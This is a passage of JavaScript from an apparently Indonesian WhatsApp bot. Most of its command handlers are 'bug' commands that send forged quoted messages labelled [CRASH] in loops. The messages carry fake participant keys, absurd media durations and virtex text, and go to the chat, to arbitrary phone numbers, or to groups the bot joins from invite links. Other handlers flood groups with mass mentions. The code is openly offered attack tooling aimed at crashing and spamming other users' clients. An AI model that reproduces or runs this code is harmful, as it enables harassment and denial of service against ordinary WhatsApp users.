{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: thumb,
fileName: `THE JO BOT               ${thejo}`,
caption: `YouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
thumbnail: virgam,
quoted: {
contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,
body: `${wm} \n${thejo}`, 
previewType:"PHOTO", 
showAdAttribution: true, 
thumbnail: virgam,
sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}},
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: fkonjo })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'buttonlocgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '3'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonLocation = {
location: {
degreesLatitude: -6.936928157735237,
degreesLongitude: 107.72270679473877},
mimetype: 'location',
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(tosendgc, buttonLocation, { quoted: fkonjo })
}
repjo(`Sukses`)
}
break

case 'unlibuttonloc': {
if (!isCreator && !isBan) return
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonLocation = {
location: {
degreesLatitude: -6.936928157735237,
degreesLongitude: 107.72270679473877},
mimetype: 'location',
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonLocation, { quoted: fkonjo })
buttonjo(`Start`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 1000)
}
break

case 'buttonloc': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonLocation = {
location: {
degreesLatitude: -6.936928157735237,
degreesLongitude: 107.72270679473877},
mimetype: 'location',
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonLocation, { quoted: fkonjo })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'jadibuttondoc':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Media`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ document: media }, 
{ upload: jobotz.waUploadToServer })
kkk = media
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: kkk,
mimetype: 'document/xlsx',
fileName: `${text}.                     ${thejo}`,
caption: `BUG BY:${text}\n${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: fkonjo })
buttonjo(`Sukses Convert Buttondoc`)
}
break

case 'buttondocgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '3'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: thumb,
mimetype: 'document/xlsx',
fileName: `THE JO BOT               ${thejo}`,
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: fkonjo })
}
repjo(`Sukses`)
}
break

case 'buttondoc': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: thumb,
mimetype: 'document/xlsx',
fileName: `THE JO BOT               ${thejo}`,
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: fkonjo })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'unlibuttondoc': {
if (!isCreator && !isBan) return
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: thumb,
mimetype: 'document/xlsx',
fileName: `THE JO BOT               ${thejo}`,
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: fkonjo })
buttonjo(`Start`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 1000)
}
break
case 'buttonimg': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
image: thumb,
mimeType: 'image/jpg',
caption: `YouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: shield2 })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jobuttonto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: thumb,
mimetype: 'document/xlsx',
fileName: `YAN BOTZ-MD               ${thejo}`,
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, buttonMessage, { quoted: shield2 })
buttonjo(`Berhasil Mengirim Button Di Nomer ${text}`)
}
break
case 'jogasbutton': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
document: thumb,
mimetype: 'document/xlsx',
fileName: `YAN BOTZ-MD               ${thejo}`,
caption: `${wm}\nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, buttonMessage, { quoted: shield2 })
jobotz.sendMessage(m.chat, buttonMessage, { quoted: shield2 })
buttonjo(`Berhasil Mengirim Button Di Nomer ${text}`)
}
break
case 'buglist':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `AMBIL SCRIPT NYA`,
description: "DI DALAM LIST",
buttonText: "CLICK DISINI",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "SCRIPT BOT",
"rows": [
{"title": virtex1, "description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", "rowId": `P`},
{"title": virtex2, "description": "© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", "rowId": `P`}
]
},
],
listType: 1
}
}), { userJid: m.chat, quoted: shield2 })
jobotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jobuglist':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
des = [
{
title: `Fixed`,
 rows: [
{title: virtex1, rowId: `Jembod`, description: `Hai \nSaya YAN BOTZ-MD`},
{title: virtex2, rowId: `Jembod`, description: `Hai \nSaya YAN BOTZ-MD`}
]
}
]
jobotz.sendListMsg(m.chat, `Script Di List\n${philips}`, jobotz.user.name,`YAN BOTZ-MD`, `YAN BOTZ-MD\n-${virtex2}`, des, shield2)
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jotagwae': {
   if (!isCreator && !isBan) return
  if (!m.isGroup) throw mess.group 
  if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 for (let i = 0; i < jumlah; i++) {
 let jansencoli = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: virgam}}}
 var teks = philips
 for (let mem of participants) {
 teks += `│➳ @${mem.id.split('@')[0]}\n`
  }
 jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: jansencoli })
 }
buttonjo(`Tag Aja`)
}
 break

case 'joslebew' : {
 if(!m.key.fromMe) return
if (!isCreator && !isBan) return
                    await jobotz.sendMessage(m.chat, {text:"ᥬ🤫᭄᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ᥬ🤫᭄"}, {quoted: fgamjo})
                    await jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃"}, {uoted: fkonjo})
                    await jobotz.sendMessage(m.chat, {text:"༒✪፝͜͡★➤⃨⃞⃟⃝𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃➤⃨⃞⃟⃝ ★፝͜͡✪༒"}, {quoted: fdocjo})
                    await jobotz.sendMessage(m.chat, {text:"⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃"}, {quoted: fgamjo})
                    await jobotz.sendMessage(m.chat, {text:"꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂"}, {quoted: fsticjo})
                    await jobotz.sendMessage(m.chat, {text:"꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂"}, {quoted: fkonjo})
                    await jobotz.sendMessage(m.chat, {text:"ᥬ🤫᭄𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃ᥬ🤫᭄"}, {quoted: fdocjo})
                    await jobotz.sendMessage(m.chat, {text:"꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂"}, {quoted: fgamjo})
                    await jobotz.sendMessage(m.chat, {text:"༒✪፝͜͡★➤⃨⃞⃟⃝𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃➤⃨⃞⃟⃝ ★፝͜͡✪༒"}, {quoted: fsticjo})
                    await jobotz.sendMessage(m.chat, {text:"༒✪፝͜͡★➤⃨⃞⃟⃝𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃➤⃨⃞⃟⃝ ★፝͜͡✪༒"}, {quoted: fkonjo})
                    await jobotz.sendMessage(m.chat, {text:"⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃ᥬ🤫᭄"}, {quoted: fdocjo})
                    buttonjo(`© YAN BOTZ-MD`)
                     }
                break
case 'jobug1':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`, 
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`),
}
}
} 
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fdoc})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug1':{
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`, 
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`),
}
}
} 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fdoc})
await repjo(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
}
break
case 'jogasbug1':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fdoc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`, 
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`),
}
}
} 
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fdoc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fdoc1})
buttonjo(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
break
case 'jobug2':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`, 
"jpegThumbnail": virgam
} 
} 
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foto})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug2':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`, 
"jpegThumbnail": virgam
} 
} 
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foto})
await repjo(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
break
case 'jogasbug2':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foto1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`, 
"jpegThumbnail": virgam
} 
} 
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foto1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foto1})
buttonjo(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
break
case 'jobug3':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fvoc})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug3':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fvoc})
await repjo(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
break
case 'jogasbug3':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fvoc1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fvoc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fvoc1})
buttonjo(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
break
case 'jobug4':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
'jpegThumbnail': fs.readFileSync(`./src/gambar/jo.jpg`),
}
}
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgif})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug4':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
'jpegThumbnail': fs.readFileSync(`./src/gambar/jo.jpg`),
}
}
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgif})
await repjo(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
break
case 'jogasbug4':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgif1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
'jpegThumbnail': fs.readFileSync(`./src/gambar/jo.jpg`),
}
}
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgif1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgif1})
buttonjo(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
break
case 'jobug5':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`), 
}
}
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:floc})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'josendbug5':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`), 
}
}
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:floc})
await repjo(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
break 
case 'jogasbug5':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let floc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`), 
}
}
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:floc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:floc1})
buttonjo(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
break 
case 'jobug6':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./src/gambar/jo.jpg`)}, 
"title": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"description": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:ftoko})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug6':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./src/gambar/jo.jpg`)}, 
"title": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"description": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:ftoko})
await repjo(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
break
case 'jogasbug6':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let ftoko1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./src/gambar/jo.jpg`)}, 
"title": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"description": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:ftoko1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:ftoko1})
buttonjo(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
break
case 'jobug7':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foncevid})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug7':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foncevid})
await repjo(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
break
case 'jogasbug7':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
